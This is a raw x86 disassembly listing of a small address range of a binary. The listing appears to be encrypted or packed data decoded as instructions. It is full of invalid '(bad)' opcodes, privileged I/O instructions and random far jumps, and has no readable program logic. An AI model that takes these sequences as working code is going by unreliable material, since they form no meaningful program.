  40d730:	es sahf 
  40d732:	jle    0x40d736
  40d734:	mov    edx,DWORD PTR [ebx-0x79]
  40d737:	cmp    BYTE PTR [edx-0x75d13cb0],bl
  40d73d:	cmc    
  40d73e:	push   ds
  40d73f:	or     eax,0xf86ffecc
  40d744:	shl    BYTE PTR [edi],cl
  40d746:	add    BYTE PTR [ebx],ah
  40d748:	adc    esp,DWORD PTR [eax+0xa]
  40d74b:	cmp    DWORD PTR [eax-0x3d],0x2f765997
  40d752:	push   0xffffffb0
  40d754:	jb     0x40d7cb
  40d756:	xor    BYTE PTR [ecx-0x80],cl
  40d759:	push   ds
  40d75a:	popa   
  40d75b:	js     0x40d6fc
  40d75d:	xlat   BYTE PTR ds:[ebx]
  40d75e:	aas    
  40d75f:	int    0x6e
  40d761:	enter  0xe969,0xcf
  40d765:	and    eax,0xff225c16
  40d76a:	add    DWORD PTR [ecx-0x4f],edi
  40d76d:	mov    edx,0x3f9cd029
  40d772:	addr16 pop edi
  40d774:	popa   
  40d775:	jae    0x40d751
  40d777:	sub    BYTE PTR [ecx],dh
  40d779:	jnp    0x40d772
  40d77b:	pop    ecx
  40d77c:	(bad)  
  40d77e:	push   cs
  40d77f:	pop    ds
  40d780:	sbb    edi,DWORD PTR [ecx+0x7e91899b]
  40d786:	test   BYTE PTR [ebx],bl
  40d788:	pusha  
  40d789:	ror    DWORD PTR [ebx],cl
  40d78b:	sbb    bl,bl
  40d78d:	mov    bl,0x91
  40d78f:	pop    ecx
  40d790:	xor    BYTE PTR [edx-0x6e],0x5f
  40d794:	pop    ecx
  40d795:	cwde   
  40d796:	ret    
  40d797:	test   ebp,ecx
  40d799:	jns    0x40d787
  40d79b:	retf   0x1432
  40d79e:	pusha  
  40d79f:	mov    esp,0xf39e4fae
  40d7a4:	fwait
  40d7a5:	cli    
  40d7a6:	dec    esp
  40d7a7:	loop   0x40d74d
  40d7a9:	daa    
  40d7aa:	mov    eax,0x407270c8
  40d7af:	leave  
  40d7b0:	mov    ds:0x80ce0ea9,eax
  40d7b5:	cdq    
  40d7b6:	mov    eax,0xf393bde
  40d7bc:	js     0x40d7e3
  40d7be:	jbe    0x40d74b
  40d7c0:	(bad)  
  40d7c2:	or     al,0x8d
  40d7c4:	(bad)  
  40d7c5:	mov    eax,ecx
  40d7c7:	mov    ebx,0x9e5f3be9
  40d7cc:	xor    BYTE PTR ds:0x9f5fb0c5,dh
  40d7d2:	cmp    al,0x3e
  40d7d4:	imul   ebp,DWORD PTR [edi-0x67248f4d],0x61
  40d7db:	cld    
  40d7dc:	loop   0x40d855
  40d7de:	inc    esi
  40d7df:	mov    ah,0xa5
  40d7e1:	lock (bad) 
  40d7e3:	push   cs
  40d7e4:	sub    ebx,DWORD PTR [ebx-0x657278ee]
  40d7ea:	(bad)  [ebp+0x6]
  40d7ed:	repnz pop ebp
  40d7ef:	jno    0x40d77b
  40d7f1:	je     0x40d792
  40d7f3:	push   edi
  40d7f4:	fiadd  DWORD PTR [edx+eax*4-0xbb75f6b]
  40d7fb:	xlat   BYTE PTR ds:[ebx]
  40d7fc:	fldenv [edi-0x6b]
  40d7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d800:	dec    ebp
  40d801:	mov    esi,0x1dd34e05
  40d806:	pop    ecx
  40d807:	and    BYTE PTR [esi+ecx*1-0x43],ch
  40d80b:	inc    ecx
  40d80c:	and    dl,BYTE PTR [edi]
  40d80e:	xchg   ah,bl
  40d810:	xchg   ebx,eax
  40d811:	dec    edi
  40d812:	adc    esp,ecx
  40d814:	cwde   
  40d815:	push   0xac8f489a
  40d81a:	jge    0x40d880
  40d81c:	and    DWORD PTR [edi],edi
  40d81e:	mov    dl,0x41
  40d820:	mov    esi,0x3242ad71
  40d825:	hlt    
  40d826:	jg     0x40d855
  40d828:	rcr    BYTE PTR [ebx+0x62faecf0],0x6a
  40d82f:	std    
  40d830:	add    eax,0xf384f3a7
  40d835:	jbe    0x40d7c4
  40d837:	out    dx,eax
  40d838:	iret   
  40d839:	stos   BYTE PTR es:[edi],al
  40d83a:	mov    dl,0xa9
  40d83c:	jne    0x40d82c
  40d83e:	lea    ecx,[edi-0x4df30f44]
  40d844:	xchg   edx,eax
  40d845:	mov    DWORD PTR [esi],ecx
  40d847:	inc    eax
  40d848:	jno    0x40d81e
  40d84a:	jle    0x40d88a
  40d84c:	loope  0x40d7e7
  40d84e:	xor    bh,BYTE PTR [ebx-0x4b96654e]
  40d854:	push   ebp
  40d855:	pop    ebp
  40d856:	jl     0x40d839
  40d858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d859:	jmp    0xd6c20fb6
  40d85e:	(bad)  
  40d85f:	xchg   edi,eax
  40d860:	xlat   BYTE PTR ds:[ebx]
  40d861:	iret   
  40d862:	or     edi,DWORD PTR [eax+edx*1+0x2c6bd6a4]
  40d869:	or     DWORD PTR [ebp+0x28],0x42
  40d86d:	mov    ds:0x366b6e25,al
  40d872:	pop    ecx
  40d873:	mov    edi,0xf2725ddf
  40d878:	dec    eax
  40d879:	inc    eax
  40d87a:	dec    edi
  40d87b:	mov    ebx,0x33ede78c
  40d880:	pop    ebp
  40d881:	push   ss
  40d882:	jbe    0x40d88b
  40d884:	call   0x4230:0x53de9b7c
  40d88b:	sub    ebp,DWORD PTR [esi]
  40d88d:	lahf   
  40d88e:	and    BYTE PTR [edx-0x4a],dh
  40d891:	pop    esi
  40d892:	idiv   DWORD PTR [edi-0x50564793]
  40d898:	cli    
  40d899:	je     0x40d82e
  40d89b:	and    al,0xcd
  40d89d:	mov    bl,0xb0
  40d8a0:	jecxz  0x40d879
  40d8a2:	dec    ecx
  40d8a3:	repz adc DWORD PTR ds:0xb5b2203b,ebx
  40d8aa:	sbb    eax,0xaeaecec8
  40d8af:	add    dh,ah
  40d8b1:	inc    esp
  40d8b2:	ds jb  0x40d914
  40d8b5:	sub    BYTE PTR [ecx-0x38f9b09f],dh
  40d8bb:	imul   BYTE PTR [edi]
  40d8bd:	push   0x1096bc1b
  40d8c2:	push   eax
  40d8c3:	push   ebx
  40d8c4:	aad    0x65
  40d8c6:	je     0x40d8ae
  40d8c8:	mov    ah,0x12
  40d8ca:	inc    ecx
  40d8cb:	nop
  40d8cc:	push   eax
  40d8cd:	inc    esi
  40d8ce:	test   eax,0x74b47987
  40d8d3:	and    esp,ebx
  40d8d5:	aas    
  40d8d6:	xchg   esi,eax
  40d8d7:	mov    dl,0xf6
  40d8d9:	add    esi,edi
  40d8db:	push   ds
  40d8dc:	sub    bh,BYTE PTR [ecx-0x79]
  40d8df:	bound  edi,QWORD PTR [ecx+0x70]
  40d8e2:	jne    0x40d949
  40d8e4:	test   DWORD PTR [eax+0x76e23e5b],ebp
  40d8ea:	push   ds
  40d8eb:	fdiv   DWORD PTR [ebp+ebp*8-0x62]
  40d8ef:	push   es
  40d8f0:	iret   
  40d8f1:	or     esi,DWORD PTR [ebp+0x7d]
  40d8f4:	pop    edx
  40d8f5:	fild   DWORD PTR [ebp+0x4e499c4c]
  40d8fb:	adc    bl,dl
  40d8fd:	jp     0x40d8f6
  40d8ff:	or     dl,BYTE PTR [edi]
  40d901:	cmovo  ecx,DWORD PTR [eax-0x3f45a1ca]
  40d908:	jns    0x40d8dc
  40d90a:	aam    0xb4
  40d90c:	fwait
  40d90d:	jae    0x40d935
  40d90f:	test   eax,0xa11b7eaa
  40d914:	dec    esp
  40d915:	mov    esi,0x7fbe20a6
  40d91a:	dec    edx
  40d91b:	jne    0x40d8aa
  40d91d:	push   ebp
  40d91e:	dec    ebx
  40d91f:	inc    eax
  40d920:	pop    eax
  40d921:	add    edi,edx
  40d923:	sbb    edi,DWORD PTR [eax-0x2a56cfd]
  40d929:	sbb    edi,DWORD PTR ds:0xf635b9d0
  40d92f:	inc    ebx
  40d930:	stos   BYTE PTR es:[edi],al
  40d931:	shr    BYTE PTR [edi+ebx*8-0x58],0x87
  40d936:	push   edi
  40d937:	pop    ecx
  40d938:	int    0x9a
  40d93a:	xchg   ebx,eax
  40d93b:	sub    BYTE PTR [eax+0x36],ah
  40d93e:	jno    0x40d951
  40d940:	push   esp
  40d941:	test   DWORD PTR [edx+esi*2-0x65a77350],edi
  40d948:	pop    edi
  40d949:	xchg   esp,eax
  40d94a:	rcl    DWORD PTR [eax],1
  40d94c:	jno    0x40d92d
  40d94e:	shl    cl,1
  40d950:	repz jmp 0x4c8265d5
  40d956:	and    bl,bl
  40d958:	xchg   ebx,eax
  40d959:	xchg   esi,eax
  40d95a:	stos   DWORD PTR es:[edi],eax
  40d95b:	aaa    
  40d95c:	sahf   
  40d95d:	push   edi
  40d95e:	push   ds
  40d95f:	mov    al,0x5c
  40d961:	push   eax
  40d962:	add    DWORD PTR [edx],ebp
  40d964:	fild   DWORD PTR [edi-0x2239b9f0]
  40d96a:	in     al,dx
  40d96b:	das    
  40d96c:	xchg   DWORD PTR [edx+0x38df94cb],ebx
  40d972:	cli    
  40d973:	push   ecx
  40d974:	sbb    DWORD PTR ds:0xffd76410,esp
  40d97a:	aaa    
  40d97b:	xchg   edx,eax
  40d97c:	fsub   st(2),st
  40d97e:	push   0xffffffb9
  40d980:	adc    ch,BYTE PTR [edx]
  40d982:	shr    DWORD PTR [ebp-0x8],1
  40d985:	(bad)  
  40d986:	popa   
  40d987:	push   ds
  40d988:	(bad)  
  40d989:	mov    al,ds:0xb8d054ed
  40d98e:	mov    ecx,DWORD PTR [ebp+edi*1+0x59440bd]
  40d995:	and    al,0x5f
  40d997:	xchg   DWORD PTR [esi+0x5c2d018b],edx
  40d99d:	lds    edx,FWORD PTR [edx]
  40d99f:	in     eax,0xb7
  40d9a1:	jecxz  0x40d9af
  40d9a3:	ret    0x99d5
  40d9a6:	stc    
  40d9a7:	xlat   BYTE PTR ds:[ebx]
  40d9a8:	sbb    ecx,DWORD PTR [ecx]
  40d9aa:	icebp  
  40d9ab:	out    dx,eax
  40d9ac:	test   edi,ebx
  40d9ae:	inc    edi
  40d9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9b0:	call   FWORD PTR [ecx+0x251a13f8]
  40d9b6:	nop
  40d9b7:	retf   0xa348
  40d9ba:	inc    edi
  40d9bb:	inc    edi
  40d9bc:	sbb    al,0x90
  40d9be:	or     eax,0x8c249d6e
  40d9c3:	or     esi,DWORD PTR [eax-0x3f2e018e]
  40d9c9:	stos   DWORD PTR es:[edi],eax
  40d9ca:	xor    al,0x2c
  40d9cc:	jmp    0x5b58:0x8b791a2c
  40d9d3:	aad    0x1
  40d9d5:	xchg   edi,eax
  40d9d6:	ja     0x40d990
  40d9d8:	and    DWORD PTR [edx-0x70],edx
  40d9db:	sub    ebx,ebx
  40d9dd:	adc    eax,0xcc3271c5
  40d9e2:	(bad)  
  40d9e3:	adc    BYTE PTR [edx],bl
  40d9e5:	xchg   edx,eax
  40d9e6:	xor    esp,edx
  40d9e8:	imul   ebx,DWORD PTR [ebx],0xe689ebe2
  40d9ee:	mov    al,ds:0x6093d702
  40d9f3:	bound  edi,QWORD PTR [esi]
  40d9f5:	fcom   QWORD PTR [ecx]
  40d9f7:	sub    dh,BYTE PTR [esi+0x24376f1f]
  40d9fd:	jns    0x40d9a8
  40d9ff:	mov    dh,0x91
  40da01:	leave  
  40da02:	out    dx,al
  40da03:	clc    
  40da04:	inc    ecx
  40da05:	xor    BYTE PTR [ebx-0x76f60b95],0x17
  40da0c:	mov    dh,0x96
  40da0e:	cmp    eax,0x470f8d61
  40da13:	mov    al,ds:0x63d7d87a
  40da18:	imul   eax,eax,0xffffff83
  40da1b:	push   ss
  40da1c:	pop    ebx
  40da1d:	out    dx,eax
  40da1e:	sbb    edi,ecx
  40da20:	dec    ecx
  40da21:	lods   al,BYTE PTR ds:[esi]
  40da22:	add    edx,edi
  40da24:	mov    ecx,0xb3c2a84e
  40da29:	lahf   
  40da2a:	aad    0x2b
  40da2c:	data16 mov dl,0x7
  40da2f:	mov    BYTE PTR [eax+0x368dd4dc],ch
  40da35:	pop    esp
  40da36:	and    BYTE PTR [ebx-0x405f844d],ah
  40da3c:	mov    dh,0x30
  40da3e:	jo     0x40da95
  40da40:	in     al,dx
  40da41:	pop    eax
  40da42:	sbb    al,0x8e
  40da44:	sub    esi,DWORD PTR [edi]
  40da46:	xor    al,0xc2
  40da48:	dec    edi
  40da49:	mov    al,0x3b
  40da4b:	mov    esp,0xf833c619
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xd8,eax
  40da6e:	mov    ebx,0xa2321f70
  40da73:	jle    0x40daf3
  40da75:	jo     0x40daf0
  40da77:	jle    0x40daf7
  40da79:	mov    ecx,DWORD PTR [ebx+0x5c]
  40da7c:	(bad)  
  40da7d:	repnz and DWORD PTR [edi-0x45],eax
  40da81:	std    
  40da82:	test   bh,dh
  40da84:	push   ss
  40da85:	push   0x57
  40da87:	mov    edx,0xd989661
  40da8c:	imul   ebp,ebp,0xfffffff7
  40da8f:	inc    ebx
  40da90:	rcr    BYTE PTR [edi+edx*8+0x38],cl
  40da94:	sub    dh,ah
  40da96:	pop    ecx
  40da97:	das    
  40da98:	add    DWORD PTR [esi],esp
  40da9a:	jmp    0x40da2f
  40da9c:	sahf   
  40da9d:	xor    dl,dl
  40da9f:	inc    edi
  40daa0:	pop    esi
  40daa1:	fsubr  QWORD PTR [edi-0x14]
  40daa4:	push   0x7d7aff2
  40daa9:	push   es
  40daaa:	sub    BYTE PTR [ebx+0x57],dl
  40daad:	in     eax,0x55
  40daaf:	in     al,dx
  40dab0:	cmp    al,0x48
  40dab2:	neg    edi
  40dab4:	das    
  40dab5:	sbb    ebx,DWORD PTR [esp+ebx*1+0x3c02d9f7]
  40dabc:	lods   al,BYTE PTR ds:[esi]
  40dabd:	fidiv  DWORD PTR [bx+di+0x7b]
  40dac1:	xchg   edx,eax
  40dac2:	sahf   
  40dac3:	in     al,0x21
  40dac5:	clc    
  40dac6:	mov    al,ds:0x8d2b05d0
  40dacb:	test   al,0x1d
  40dacd:	and    al,0x8a
  40dacf:	test   al,0x54
  40dad1:	mov    dl,0x3d
  40dad3:	cmp    DWORD PTR [esi],esp
  40dad5:	mov    dh,0x2e
  40dad7:	popf   
  40dad8:	push   edi
  40dad9:	inc    edi
  40dada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dadb:	cmp    ch,BYTE PTR [ebx+0x6d86a820]
  40dae1:	push   es
  40dae2:	pusha  
  40dae3:	sub    dl,BYTE PTR [ebx]
  40dae5:	outs   dx,BYTE PTR ds:[esi]
  40dae6:	sub    al,0x74
  40dae8:	aas    
  40dae9:	add    esp,DWORD PTR [edx-0x76912084]
  40daef:	(bad)  
  40daf0:	push   edi
  40daf1:	and    ebx,ebx
  40daf3:	cli    
  40daf4:	repz inc ebx
  40daf6:	mov    bh,0xcb
  40daf8:	test   eax,0x2b404d66
  40dafd:	or     eax,0xc5cfc438
  40db02:	push   esi
  40db03:	mov    edx,0x11abe846
  40db08:	in     eax,0x4d
  40db0a:	jl     0x40dafd
  40db0c:	add    esp,esi
  40db0e:	xor    al,0xf7
  40db10:	fcom   QWORD PTR [ebx-0x36db438c]
  40db16:	xor    ecx,DWORD PTR [edx]
  40db18:	(bad)
  40db1b:	xor    edx,DWORD PTR [eax]
  40db1d:	sub    esi,DWORD PTR [esp+esi*4]
  40db20:	test   al,0x49
  40db22:	xchg   ebx,eax
  40db23:	cmp    DWORD PTR [ecx],edx
  40db25:	pop    edx
  40db27:	push   ecx
  40db28:	and    DWORD PTR [edi],edx
  40db2a:	jp     0x40db89
  40db2c:	mov    eax,ds:0x9d7033d2
  40db31:	scas   al,BYTE PTR es:[edi]
  40db32:	inc    edx
  40db33:	xchg   edx,eax
  40db34:	jo     0x40dabb
  40db36:	inc    ecx
  40db37:	(bad)  
  40db38:	(bad)  
  40db39:	mov    DWORD PTR [ebx-0xa],ebp
  40db3c:	sub    ebx,DWORD PTR [ebp+edi*1+0x253443e2]
  40db43:	push   es
  40db44:	cmp    ebx,DWORD PTR [edi]
  40db46:	xor    eax,0xe725ff42
  40db4b:	pop    edx
  40db4c:	dec    ebx
  40db4d:	adc    dh,BYTE PTR [ecx+0x11c1c310]
  40db53:	jns    0x40db46
  40db55:	fucom  st(6)
  40db57:	shrd   esi,esi,0x12
  40db5b:	ins    BYTE PTR es:[edi],dx
  40db5c:	sub    esi,edx
  40db5e:	les    edi,FWORD PTR [esi+0x55f0f610]
  40db64:	arpl   WORD PTR [ebp+0x3f361055],sp
  40db6a:	cli    
  40db6b:	shl    BYTE PTR [ecx-0xe],1
  40db6e:	(bad)  
  40db6f:	jp     0x40db68
  40db71:	or     BYTE PTR [ebp+0x66],ah
  40db74:	cmc    
  40db75:	out    dx,eax
  40db76:	mov    esi,0xb21b0b8f
  40db7b:	ret    0x525e
  40db7e:	sbb    DWORD PTR [ebx+0x0],esi
  40db81:	int3   
  40db82:	nop
  40db83:	mov    edx,0xb5ad18b8
  40db88:	xor    eax,0x3ebc249e
  40db8d:	jae    0x40db48
  40db8f:	push   ecx
  40db90:	mov    dh,0xb3
  40db92:	mov    BYTE PTR [edx+0x58c189dc],al
  40db98:	dec    esp
  40db99:	cmp    BYTE PTR [edi],dl
  40db9b:	inc    esp
  40db9d:	dec    edx
  40db9e:	cld    
  40db9f:	sbb    ch,bh
  40dba1:	retf   
  40dba2:	loop   0x40db7c
  40dba4:	mov    ds:0x8ef7e915,eax
  40dba9:	add    eax,0xe8066b99
  40dbae:	mov    ebx,0xf1cd4d12
  40dbb3:	sbb    eax,DWORD PTR [ecx]
  40dbb5:	cld    
  40dbb6:	inc    edi
  40dbb7:	push   esp
  40dbb8:	add    DWORD PTR [esi+0x3e8f9edf],ebx
  40dbbe:	or     eax,0x397d5bef
  40dbc3:	mov    edi,0x1e2fb200
  40dbc8:	mov    ch,0x82
  40dbca:	cmp    DWORD PTR [edi+0x5bc7eaf0],ebx
  40dbd0:	xor    ebp,ecx
  40dbd2:	fild   DWORD PTR [ebp-0x71e64f14]
  40dbd8:	stc    
  40dbd9:	les    eax,FWORD PTR [edi-0x766f0bc3]
  40dbdf:	xor    esi,DWORD PTR [edi+0x66]
  40dbe2:	inc    eax
  40dbe3:	mov    ah,0x8e
  40dbe5:	mov    dh,0x7a
  40dbe7:	inc    edi
  40dbe8:	cmp    BYTE PTR [ecx+0x7b],bh
  40dbeb:	xchg   ebx,eax
  40dbec:	inc    ebx
  40dbed:	xchg   edx,eax
  40dbee:	loop   0x40db73
  40dbf0:	in     eax,0x92
  40dbf2:	push   0xffffffea
  40dbf4:	jno    0x40dc0b
  40dbf6:	add    ecx,eax
  40dbf8:	jns    0x40dbac
  40dbfa:	inc    esp
  40dbfb:	xor    dh,BYTE PTR [esp+edi*2]
  40dbfe:	xchg   esp,eax
  40dbff:	rol    BYTE PTR ds:0xb05f9822,0xf9
  40dc06:	bound  ecx,QWORD PTR [ecx+ebx*8-0x43a4a921]
  40dc0d:	mov    BYTE PTR fs:[esp+edx*8-0x15],cl
  40dc12:	call   FWORD PTR [edi]
  40dc14:	or     ah,BYTE PTR [eax-0x1dd20e48]
  40dc1a:	push   cs
  40dc1b:	jae    0x40dbc9
  40dc1d:	mov    bh,0x68
  40dc1f:	nop
  40dc20:	dec    esi
  40dc21:	fstp   QWORD PTR [ebp-0x44]
  40dc24:	xacquire lock xchg BYTE PTR [eax-0x5c],ch
  40dc29:	sbb    DWORD PTR [eax],0x313b3562
  40dc2f:	rol    BYTE PTR [ebx+0x43],0x9d
  40dc33:	arpl   WORD PTR [esi+eiz*1+0x107532f4],dx
  40dc3a:	das    
  40dc3b:	add    BYTE PTR [ebx],0x95
  40dc3e:	sub    al,0x8a
  40dc40:	jg     0x40dc6a
  40dc42:	repz std 
  40dc44:	call   0xeadfc4b7
  40dc49:	mov    eax,0x20e3ebb0
  40dc4e:	mov    al,ds:0x87c2b07c
  40dc53:	out    dx,al
  40dc54:	call   0x8a7bd59c
  40dc59:	adc    esi,eax
  40dc5b:	mov    dl,0xf4
  40dc5d:	adc    ch,BYTE PTR [esi]
  40dc5f:	pop    ebp
  40dc60:	cmc    
  40dc61:	mov    esp,0x1a22a2aa
  40dc66:	or     bl,BYTE PTR [edi+0x71]
  40dc69:	xlat   BYTE PTR ds:[ebx]
  40dc6a:	mov    eax,ds:0xe9f1df40
  40dc6f:	add    DWORD PTR [esi+0x17],esp
  40dc72:	xor    DWORD PTR [ecx+eiz*2],eax
  40dc75:	aad    0x30
  40dc77:	dec    edi
  40dc78:	nop
  40dc79:	dec    ebx
  40dc7a:	fdiv   QWORD PTR [eax]
  40dc7c:	pop    ecx
  40dc7d:	call   0xbb90083b
  40dc82:	push   edx
  40dc83:	xor    al,0x51
  40dc85:	lods   eax,DWORD PTR ds:[esi]
  40dc86:	push   0xffffffc4
  40dc88:	pop    edi
  40dc89:	mov    esi,0xc9d2fbc9
  40dc8e:	fwait
  40dc8f:	(bad)  
  40dc91:	mov    ebx,0x1f58e16c
  40dc96:	ds cmc 
  40dc98:	pop    ecx
  40dc99:	inc    esp
  40dc9a:	inc    edx
  40dc9b:	imul   eax,DWORD PTR [ebp-0xb],0xd0f748bd
  40dca2:	mov    al,ds:0x3981036c
  40dca7:	fist   DWORD PTR [ecx-0x63a6d77c]
  40dcad:	cs jmp 0x40dc65
  40dcb0:	or     eax,0x55269db5
  40dcb5:	cmp    bh,BYTE PTR cs:[esi-0x6ac22e03]
  40dcbc:	cmp    eax,0x8d130f56
  40dcc1:	push   ebp
  40dcc2:	cmp    DWORD PTR [eax+eiz*2-0x378ccf77],eax
  40dcc9:	jbe    0x40dc5f
  40dccb:	adc    ah,ch
  40dccd:	add    dh,cl
  40dccf:	adc    al,0x26
  40dcd1:	mov    ah,0x4e
  40dcd3:	inc    esi
  40dcd4:	jle    0x40dd0a
  40dcd6:	sbb    ebp,DWORD PTR [esi-0x69]
  40dcd9:	test   eax,0xb0a968ca
  40dcde:	and    al,0x96
  40dce0:	jns    0x40dd3b
  40dce2:	sub    DWORD PTR [edx+0x5f],ebp
  40dce5:	adc    ebp,esi
  40dce7:	push   cs
  40dce8:	repz add BYTE PTR [edx],ah
  40dceb:	mov    dh,BYTE PTR [edx-0x6674a75d]
  40dcf1:	aam    0x9c
  40dcf3:	fimul  WORD PTR [ebp+0x1a54c201]
  40dcf9:	clc    
  40dcfa:	inc    eax
  40dcfb:	push   eax
  40dcfc:	mov    ch,0xe
  40dcfe:	mov    al,ds:0x27a8c92e
  40dd03:	sar    cl,cl
  40dd05:	aaa    
  40dd06:	jge    0x40dd5f
  40dd08:	fcom   st(0)
  40dd0a:	jnp    0x40dc9e
  40dd0c:	lods   eax,DWORD PTR ds:[esi]
  40dd0d:	or     cl,BYTE PTR [esp+edx*8-0x6d]
  40dd11:	push   eax
  40dd13:	add    eax,0x67a04be1
  40dd18:	pop    ds
  40dd19:	rol    DWORD PTR [ebp-0x20d6f607],1
  40dd1f:	repz push eax
  40dd21:	(bad)  
  40dd22:	sbb    al,0xdc
  40dd24:	stos   BYTE PTR es:[edi],al
  40dd25:	aad    0xfb
  40dd27:	or     eax,ecx
  40dd29:	xchg   ecx,eax
  40dd2a:	ret    
  40dd2b:	xchg   ebx,eax
  40dd2c:	mov    al,ds:0xbe737a2c
  40dd31:	fldcw  WORD PTR [ebx]
  40dd33:	push   cs
  40dd34:	mov    eax,fs
  40dd36:	call   0x38565964
  40dd3b:	fwait
  40dd3c:	inc    edx
  40dd3d:	pop    esp
  40dd3e:	jne    0x40dd1f
  40dd40:	ins    DWORD PTR es:[edi],dx
  40dd41:	mov    WORD PTR [eax+0x38f32c72],ss
  40dd47:	mov    esp,0xdf08225
  40dd4c:	or     eax,0xb5110b5
  40dd51:	add    eax,0xbb76b90f
  40dd56:	xchg   BYTE PTR [eax+0x1b8cc568],bl
  40dd5c:	pop    ebx
  40dd5d:	outs   dx,DWORD PTR ds:[esi]
  40dd5e:	and    cl,BYTE PTR ss:[ecx+0x70]
  40dd62:	jns    0x40dd83
  40dd64:	sti    
  40dd65:	clc    
  40dd66:	pusha  
  40dd67:	mov    ecx,0x94c07a6a
  40dd6c:	or     ch,cl
  40dd6e:	dec    esp
  40dd6f:	sub    eax,0x7b51f2cd
  40dd74:	test   BYTE PTR [ecx],al
  40dd76:	and    al,0xd1
  40dd78:	aaa    
  40dd79:	pop    eax
  40dd7a:	inc    esp
  40dd7b:	adc    ah,BYTE PTR [esi+0x5d]
  40dd7e:	cmp    eax,0x7d078f3f
  40dd83:	cli    
  40dd84:	and    al,0x84
  40dd86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd87:	inc    edx
  40dd88:	aad    0x5
  40dd8a:	push   es
  40dd8b:	jl     0x40de03
  40dd8d:	push   edi
  40dd8e:	retf   
  40dd8f:	out    0x30,al
  40dd91:	mov    al,ds:0xf0548a62
  40dd96:	stos   BYTE PTR es:[edi],al
  40dd97:	xchg   ebp,eax
  40dd98:	push   eax
  40dd99:	xchg   ecx,eax
  40dd9a:	lods   al,BYTE PTR ds:[esi]
  40dd9b:	dec    DWORD PTR [ebp-0x17]
  40dd9e:	cmp    DWORD PTR [ecx+0x6],eax
  40dda1:	sub    al,0xb7
  40dda3:	(bad)  
  40dda4:	jo     0x40dda0
  40dda6:	sub    esi,esp
  40dda8:	test   al,0x2c
  40ddaa:	cwde   
  40ddab:	leave  
  40ddac:	mov    dl,0x94
  40ddae:	clc    
  40ddaf:	repnz pop es
  40ddb1:	jbe    0x40ddd0
  40ddb3:	fdiv   QWORD PTR [edi]
  40ddb5:	xlat   BYTE PTR ds:[ebx]
  40ddb6:	pop    ss
  40ddb7:	jne    0x40de20
  40ddb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddba:	jns    0x40dd74
  40ddbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddbd:	xchg   esi,eax
  40ddbe:	cmp    bh,ah
  40ddc0:	retf   0x8c3f
  40ddc3:	ret    0x1533
  40ddc6:	mov    edi,0x41a94ee0
  40ddcb:	jl     0x40de24
  40ddcd:	push   ss
  40ddce:	pop    ds
  40ddcf:	mov    al,ds:0x4f91128d
  40ddd4:	mov    ah,0x34
  40ddd6:	mov    ebp,0xfe5136c1
  40dddb:	mov    edx,0xbacae176
  40dde0:	mov    ds,WORD PTR [ecx+edx*1-0x35b7b165]
  40dde7:	fs or  al,0xb6
  40ddea:	adc    ebx,eax
  40ddec:	mov    ch,0x8e
  40ddee:	mov    ebx,0x997fe3b4
  40ddf3:	jne    0x40de35
  40ddf5:	inc    edx
  40ddf6:	mov    edi,0x6b01c3fa
  40ddfb:	ret    
  40ddfc:	mov    bh,0x9
  40ddfe:	mov    eax,ds:0x5d4beffc
  40de03:	jp     0x40ddd2
  40de05:	inc    ebp
  40de06:	lahf   
  40de07:	mov    ebp,DWORD PTR [esi+0x6c]
  40de0a:	jnp    0x40de5a
  40de0c:	or     BYTE PTR [edi+0x1a],bl
  40de0f:	fist   WORD PTR [esi+0x1024dcd7]
  40de15:	sub    BYTE PTR [edx+esi*1-0x14d04572],cl
  40de1c:	add    ah,BYTE PTR [ecx-0x528b32f3]
  40de22:	xor    ebp,esi
  40de24:	je     0x40de6c
  40de26:	sub    eax,DWORD PTR [esi]
  40de28:	cdq    
  40de29:	pop    esi
  40de2a:	push   ss
  40de2b:	das    
  40de2c:	stos   BYTE PTR es:[edi],al
  40de2d:	dec    ebp
  40de2e:	ins    BYTE PTR es:[edi],dx
  40de2f:	or     al,0x2b
  40de31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de32:	mov    WORD PTR [esi-0x11773669],ss
  40de38:	and    BYTE PTR ds:0x60f240e,cl
  40de3e:	or     eax,0xc35bf460
  40de43:	es xchg ecx,eax
  40de45:	es out dx,al
  40de47:	mov    cl,0xe1
  40de49:	enter  0x639a,0x97
  40de4d:	mov    edx,DWORD PTR [ecx]
  40de4f:	jb     0x40de98
  40de51:	pop    es
  40de52:	cdq    
  40de53:	push   es
  40de54:	and    BYTE PTR [eax-0x72cfa0bd],ch
  40de5a:	push   es
  40de5b:	ins    DWORD PTR es:[edi],dx
  40de5c:	mov    dl,0x1a
  40de5e:	cdq    
  40de5f:	mov    WORD PTR [eax],?
  40de61:	sub    al,0x49
  40de63:	jb     0x40de8c
  40de65:	jmp    0x40de14
  40de67:	(bad)  
  40de68:	mov    bh,0x3e
  40de6a:	add    eax,0xa0a640b8
  40de6f:	mov    ds:0x89782fc3,eax
  40de74:	push   ebp
  40de75:	clc    
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	inc    edx
  40de92:	sub    bl,BYTE PTR ss:[ecx]
  40de95:	xor    al,0xae
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	pop    esp
  40de9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de9f:	test   al,0x79
  40dea1:	add    eax,0x52279e21
  40dea6:	sub    eax,0xb448792a
  40deab:	xchg   esi,eax
  40deac:	push   es
  40dead:	pop    ebp
